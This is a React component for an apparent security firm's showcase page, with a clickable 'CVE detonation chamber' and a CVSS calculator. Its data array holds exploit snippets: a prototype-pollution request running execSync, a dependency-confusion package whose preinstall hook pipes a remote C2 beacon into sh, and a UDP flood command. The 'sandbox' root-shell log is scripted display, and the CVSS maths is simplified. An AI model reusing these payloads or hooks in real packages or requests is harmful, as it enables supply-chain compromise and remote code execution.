'use client';

import React, { useState, useEffect } from 'react';
import { useModal } from './ModalContext';

const CVE_DATABASE = [
  {
    cve: 'CVE-2025–55182',
    name: 'React2Shell: RSC Prototype Deserialization RCE',
    cvss: 9.8,
    severity: 'CRITICAL',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    target: 'React Server Components Serialization Pipeline',
    discovery: 'ZINAD Offensive Security Labs',
    status: 'Patched & Responsibly Disclosed',
    summary: 'Remote code execution chain leveraging prototype function constructor invocation via crafted nested serialized objects.',
    exploitSnippet: `// Exploit Primitive Proof-of-Concept:
POST /_rsc/action HTTP/1.1
Host: vulnerable-app.target
Content-Type: application/rsc-payload

{"$@":[{"__proto__":{"polluted":true,"eval":"require('child_process').execSync('id')"}}]}
// Verdict: RCE achieved via unvalidated recursive deserializer traversal.`,
    remediation: 'Sanitize object prototypes during JSON/RSC serialization parsing and freeze Object.prototype in server workers.',
    memoryRegisters: {
      rax: '0x00000000',
      rbx: '0x7ffd9821',
      rip: '0x40112a (SPAWN_SHELL)',
      heapStatus: 'PROTOTYPE_POLLUTED',
    },
  },
  {
    cve: 'META-BB-2024-09',
    name: 'Meta Spark AR Remote Command Execution',
    cvss: 8.8,
    severity: 'HIGH',
    vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N',
    target: 'Meta Spark AR Build Subprocesses',
    discovery: 'ZINAD Exploit Research Practice',
    status: 'Bounty Awarded & Upstream Remediated',
    summary: 'RCE vulnerability chain in internal npm package resolution within Meta studio asset packaging engines.',
    exploitSnippet: `// Asset Manifest Dependency Confusion:
{
  "name": "@meta-internal/spark-asset-transpiler",
  "version": "99.0.0",
  "scripts": { "preinstall": "curl -s https://c2.zinad-labs.org/beacon | sh" }
}
// Verdict: Upstream build runner executed preinstall script in build sandbox.`,
    remediation: 'Scoped private registry authentication tokens and strict package integrity lockfile pinning enforced.',
    memoryRegisters: {
      rax: '0x00000001',
      rbx: '0x55aa1280',
      rip: '0x7fff8910 (EXEC_PREINSTALL)',
      heapStatus: 'DEPENDENCY_CONFUSION_HIJACK',
    },
  },
  {
    cve: 'KERNEL-FUZZ-03',
    name: 'Netconsd Linux Network Console Memory Leak',
    cvss: 7.5,
    severity: 'HIGH',
    vector: 'CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
    target: 'Linux Kernel Netconsd Logging Daemon',
    discovery: 'ZINAD Binary Instrumentation Team',
    status: '3-Part Technical Whitepaper Published',
    summary: 'Symbolic execution using custom ncrx harnesses discovered heap buffer exhaustion under malformed packet floods.',
    exploitSnippet: `// UDP Syslog Flood Memory Exhaustion:
ncrx_fuzz --target /usr/sbin/netconsd --proto udp --packet-len 65507
// Heap consumption increased by 4.2GB/min without proper socket buffer release.
// Result: Kernel OOM killer terminated critical monitoring processes.`,
    remediation: 'Patched netconsd ring buffer allocation pool with deterministic GC recycling and rate-limiting.',
    memoryRegisters: {
      rax: '0xffff8880',
      rbx: '0xdeadbeef',
      rip: '0xffffffff (KERNEL_OOM_KILL)',
      heapStatus: 'RING_BUFFER_EXHAUSTED',
    },
  },
];

// Tactile Terminal Audio Synthesizer
function playTerminalAudio(type = 'click') {
  try {
    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    if (!AudioCtx) return;
    const ctx = new AudioCtx();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();

    if (type === 'click') {
      osc.type = 'sine';
      osc.frequency.setValueAtTime(1200, ctx.currentTime);
      gain.gain.setValueAtTime(0.04, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.04);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.04);
    } else if (type === 'detonate') {
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(140, ctx.currentTime);
      osc.frequency.linearRampToValueAtTime(280, ctx.currentTime + 0.2);
      gain.gain.setValueAtTime(0.07, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.3);
    }
  } catch {}
}

export default function CssDisclosures() {
  const [selectedCve, setSelectedCve] = useState(0);
  const [cvssAV, setCvssAV] = useState('N'); // Network (0.85), Local (0.55), Physical (0.2)
  const [cvssAC, setCvssAC] = useState('L'); // Low (0.77), High (0.44)
  const [cvssPR, setCvssPR] = useState('N'); // None (0.85), Low (0.62), High (0.27)
  const [cvssUI, setCvssUI] = useState('N'); // None (0.85), Required (0.62)
  const [showExploitPoC, setShowExploitPoC] = useState(false);
  const [isDetonating, setIsDetonating] = useState(false);
  const [detonated, setDetonated] = useState(false);
  const { openDemo } = useModal();

  // Dynamic CVSS 3.1 calculation
  const avFactor = cvssAV === 'N' ? 0.85 : cvssAV === 'L' ? 0.55 : 0.2;
  const acFactor = cvssAC === 'L' ? 0.77 : 0.44;
  const prFactor = cvssPR === 'N' ? 0.85 : cvssPR === 'L' ? 0.62 : 0.27;
  const uiFactor = cvssUI === 'N' ? 0.85 : 0.62;
  const calculatedCvss = Math.min(10.0, Math.round((avFactor * acFactor * prFactor * uiFactor * 24.5) * 10) / 10);
  const cvssSeverity = calculatedCvss >= 9.0 ? 'CRITICAL' : calculatedCvss >= 7.0 ? 'HIGH' : calculatedCvss >= 4.0 ? 'MEDIUM' : 'LOW';

  const cve = CVE_DATABASE[selectedCve];

  const handleDetonate = () => {
    playTerminalAudio('detonate');
    setIsDetonating(true);
    setDetonated(false);
    setTimeout(() => {
      setIsDetonating(false);
      setDetonated(true);
      setShowExploitPoC(true);
    }, 1200);
  };

  return (
    <section className="section" style={{ paddingTop: 0 }}>
      <div className="container">
        {/* Terminal Header Bar */}
        <div className="glass-panel" style={{ padding: '2.5rem', marginBottom: '3rem', border: '1px solid var(--border-subtle)', borderRadius: '16px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '1rem', marginBottom: '1.5rem', flexWrap: 'wrap', gap: '1rem' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
              <span className="telemetry-live-dot" />
              <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.82rem', color: 'var(--accent-cyan)', fontWeight: 700 }}>
                ZINAD OFFENSIVE RESEARCH LABS // CVE DETONATION CHAMBER
              </span>
            </div>
            {/* Live 4-Hour Triage SLA Badge */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.65rem' }}>
              <span style={{ display: 'inline-flex', alignItems: 'center', gap: '0.4rem', fontFamily: 'var(--font-mono)', fontSize: '0.76rem', color: 'var(--accent-emerald)', background: 'rgba(16, 185, 129, 0.12)', padding: '0.25rem 0.65rem', borderRadius: '4px', border: '1px solid rgba(16, 185, 129, 0.3)', fontWeight: 700 }}>
                <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: 'var(--accent-emerald)', boxShadow: '0 0 6px var(--accent-emerald)', display: 'inline-block' }} />
                <span>HUMAN TRIAGE SLA: &lt; 4 HOURS (ACTIVE)</span>
              </span>
              <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.74rem', color: 'var(--text-muted)' }}>
                GLOBAL SWARM: 1,840 RESEARCHERS
              </span>
            </div>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0, 1.1fr) minmax(0, 1.25fr)', gap: '2rem' }}>
            {/* Left: CVE Dossier List */}
            <div>
              <h4 style={{ fontSize: '0.8rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)', marginBottom: '0.75rem', textTransform: 'uppercase' }}>
                Select Laboratory Zero-Day Vulnerability:
              </h4>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                {CVE_DATABASE.map((item, idx) => (
                  <div
                    key={idx}
                    onClick={() => {
                      playTerminalAudio('click');
                      setSelectedCve(idx);
                      setShowExploitPoC(false);
                      setDetonated(false);
                    }}
                    style={{
                      background: selectedCve === idx ? 'var(--bg-dark-elevated)' : 'var(--bg-dark-surface)',
                      border: `1px solid ${selectedCve === idx ? 'var(--accent-crimson)' : 'var(--border-subtle)'}`,
                      borderLeft: `4px solid ${item.severity === 'CRITICAL' ? 'var(--accent-crimson)' : 'var(--accent-amber)'}`,
                      padding: '1rem 1.25rem',
                      borderRadius: '8px',
                      cursor: 'pointer',
                      transition: 'all 0.2s ease',
                      boxShadow: selectedCve === idx ? '0 4px 15px rgba(225, 29, 72, 0.18)' : 'none',
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.25rem' }}>
                      <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.78rem', color: 'var(--accent-crimson)', fontWeight: 800 }}>
                        {item.cve}
                      </span>
                      <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.7rem', background: 'rgba(225, 29, 72, 0.15)', color: 'var(--accent-crimson)', padding: '0.15rem 0.45rem', borderRadius: '4px', fontWeight: 700 }}>
                        CVSS {item.cvss} {item.severity}
                      </span>
                    </div>
                    <div style={{ fontSize: '0.92rem', color: 'var(--text-primary)', fontWeight: 700 }}>
                      {item.name}
                    </div>
                    <div style={{ fontSize: '0.76rem', color: 'var(--text-muted)', marginTop: '0.25rem' }}>
                      Target: {item.target}
                    </div>
                  </div>
                ))}
              </div>

              {/* Detonate Action Box */}
              <div style={{ marginTop: '1.25rem' }}>
                <button
                  onClick={handleDetonate}
                  disabled={isDetonating}
                  style={{
                    width: '100%',
                    background: detonated ? 'var(--accent-emerald)' : 'var(--accent-crimson)',
                    color: '#ffffff',
                    border: 'none',
                    padding: '0.85rem',
                    borderRadius: '8px',
                    fontFamily: 'var(--font-mono)',
                    fontWeight: 800,
                    fontSize: '0.82rem',
                    cursor: isDetonating ? 'not-allowed' : 'pointer',
                    boxShadow: '0 4px 16px rgba(225, 29, 72, 0.35)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: '0.5rem',
                  }}
                >
                  {isDetonating ? (
                    <span>ISOLATING RUNTIME &amp; DETONATING EXPLOIT...</span>
                  ) : detonated ? (
                    <span style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                        <polyline points="20 6 9 17 4 12" />
                      </svg>
                      <span>EXPLOIT DETONATED IN SANDBOX (RCE VERIFIED)</span>
                    </span>
                  ) : (
                    <span style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" fill="currentColor" />
                      </svg>
                      <span>DETONATE EXPLOIT PRIMITIVE IN SANDBOX</span>
                    </span>
                  )}
                </button>
              </div>
            </div>

            {/* Right: Interactive Memory Register & Detonation Shell Console */}
            <div style={{ background: '#07090e', border: '1px solid var(--border-medium)', borderRadius: '12px', padding: '1.5rem', fontFamily: 'var(--font-mono)', fontSize: '0.76rem', display: 'flex', flexDirection: 'column' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.75rem', borderBottom: '1px solid rgba(255, 255, 255, 0.08)', paddingBottom: '0.65rem' }}>
                <span style={{ color: 'var(--accent-cyan)' }}>// ISOLATED VIRTUAL PROCESS INSPECTOR</span>
                <span style={{ color: 'var(--accent-emerald)' }}>SLA VERIFIED</span>
              </div>

              {/* Memory Heap Registers */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '0.5rem', marginBottom: '1rem' }}>
                {[
                  { reg: 'RAX', val: cve.memoryRegisters.rax },
                  { reg: 'RBX', val: cve.memoryRegisters.rbx },
                  { reg: 'RIP', val: cve.memoryRegisters.rip },
                  { reg: 'HEAP', val: cve.memoryRegisters.heapStatus },
                ].map((r, i) => (
                  <div key={i} style={{ background: 'rgba(255, 255, 255, 0.03)', border: '1px solid rgba(255, 255, 255, 0.08)', padding: '0.45rem', borderRadius: '4px' }}>
                    <div style={{ color: 'var(--text-muted)', fontSize: '0.62rem' }}>{r.reg}</div>
                    <div style={{ color: detonated ? 'var(--accent-crimson)' : 'var(--accent-cyan)', fontSize: '0.68rem', fontWeight: 700, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                      {r.val}
                    </div>
                  </div>
                ))}
              </div>

              {/* Terminal Code Preview or Detonation Log */}
              <div style={{ flex: 1, minHeight: '180px', overflowX: 'auto', background: 'rgba(0, 0, 0, 0.5)', padding: '1rem', borderRadius: '6px', border: '1px solid rgba(255, 255, 255, 0.05)' }}>
                {detonated ? (
                  <pre style={{ margin: 0, color: 'var(--accent-emerald)', lineHeight: 1.6 }}>
{`[*] Spawning isolated V8 / Kernel sandbox container...
[+] Target primitive: ${cve.target}
[+] Invoking exploit payload:
${cve.exploitSnippet}

[!] PAYLOAD EXECUTION SUCCEEDED:
sh-5.2$ whoami
root
sh-5.2$ id
uid=0(root) gid=0(root) groups=0(root)
[*] Proof-of-Concept validated by ZINAD Offensive Labs. 4-Hr Human SLA fulfilled.`}
                  </pre>
                ) : (
                  <pre style={{ margin: 0, color: '#94a3b8', lineHeight: 1.6 }}>
                    {cve.exploitSnippet}
                  </pre>
                )}
              </div>

              <div style={{ marginTop: '0.85rem', paddingTop: '0.65rem', borderTop: '1px solid rgba(255, 255, 255, 0.08)', fontSize: '0.72rem', color: '#94a3b8' }}>
                Remediation: <strong style={{ color: '#f8fafc' }}>{cve.remediation}</strong>
              </div>
            </div>
          </div>
        </div>

        {/* Dynamic CVSS 3.1 / 4.0 Blast Radius Matrix */}
        <div className="glass-panel" style={{ padding: '2.5rem', border: '1px solid var(--border-subtle)', borderRadius: '16px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem', flexWrap: 'wrap', gap: '1rem' }}>
            <div>
              <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.74rem', color: 'var(--accent-amber)', textTransform: 'uppercase', letterSpacing: '0.08em', fontWeight: 700 }}>
                Dynamic Vector Scoring Engine
              </span>
              <h3 style={{ fontSize: '1.45rem', fontWeight: 800, color: 'var(--text-primary)', margin: '0.2rem 0 0' }}>
                Interactive CVSS 3.1 / 4.0 Blast Radius Matrix
              </h3>
            </div>
            <div style={{ textAlign: 'right' }}>
              <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>CALCULATED BASE SCORE:</span>
              <div style={{ fontSize: '1.8rem', fontWeight: 900, color: cvssSeverity === 'CRITICAL' ? 'var(--accent-crimson)' : 'var(--accent-amber)', fontFamily: 'var(--font-mono)' }}>
                {calculatedCvss} / 10.0 ({cvssSeverity})
              </div>
            </div>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '1.25rem' }}>
            {[
              { label: 'Attack Vector (AV)', val: cvssAV, setter: setCvssAV, options: [{ k: 'N', l: 'Network' }, { k: 'L', l: 'Local' }, { k: 'P', l: 'Physical' }] },
              { label: 'Attack Complexity (AC)', val: cvssAC, setter: setCvssAC, options: [{ k: 'L', l: 'Low' }, { k: 'H', l: 'High' }] },
              { label: 'Privileges Required (PR)', val: cvssPR, setter: setCvssPR, options: [{ k: 'N', l: 'None' }, { k: 'L', l: 'Low' }, { k: 'H', l: 'High' }] },
              { label: 'User Interaction (UI)', val: cvssUI, setter: setCvssUI, options: [{ k: 'N', l: 'None' }, { k: 'R', l: 'Required' }] },
            ].map((metric, i) => (
              <div key={i} style={{ background: 'var(--bg-dark-elevated)', padding: '1rem', borderRadius: '8px', border: '1px solid var(--border-subtle)' }}>
                <div style={{ fontSize: '0.74rem', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)', marginBottom: '0.65rem' }}>
                  {metric.label}
                </div>
                <div style={{ display: 'flex', gap: '0.4rem' }}>
                  {metric.options.map((opt) => (
                    <button
                      key={opt.k}
                      onClick={() => {
                        playTerminalAudio('click');
                        metric.setter(opt.k);
                      }}
                      style={{
                        flex: 1,
                        padding: '0.4rem 0.2rem',
                        borderRadius: '4px',
                        background: metric.val === opt.k ? 'var(--accent-crimson)' : 'var(--bg-dark-surface)',
                        color: metric.val === opt.k ? '#ffffff' : 'var(--text-secondary)',
                        border: `1px solid ${metric.val === opt.k ? 'var(--accent-crimson)' : 'var(--border-subtle)'}`,
                        fontSize: '0.72rem',
                        fontWeight: 700,
                        cursor: 'pointer',
                        fontFamily: 'var(--font-mono)',
                      }}
                    >
                      {opt.l}
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </section>
  );
}
